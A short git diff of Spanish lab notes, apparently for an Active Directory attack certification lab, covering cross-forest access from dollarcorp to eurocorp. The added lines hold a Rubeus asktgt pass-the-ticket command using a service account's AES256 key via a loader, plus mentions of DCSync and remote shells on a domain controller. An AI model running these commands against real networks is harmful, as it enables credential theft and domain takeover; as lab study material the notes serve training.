@@ -1397,6 +1397,11 @@ winrs -r:mcorp-dc.moneycorp.local cmd
 También podemos ejecutar ataques *DCSync* contra *moneycorpor* 
 
 *LO - 20*
-Con los privilegios de DA en dollarcorp.moneycorp.local, obtenga acceso a la participación de SharedwithDCorp en el DC de eurocorp.local fores
+Con los privilegios de DA en dollarcorp.moneycorp.local, obtenga acceso a la participación de SharedwithDCorp en el DC de eurocorp.local forest
 
-Neces
+Necesitaremos la clave de confianza entre *dollarcorp* y *europcorp* 
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+En el nuevo proceso que se nos genera deberemos de copiar el *Loader* a la maquina *dcorp-dc*
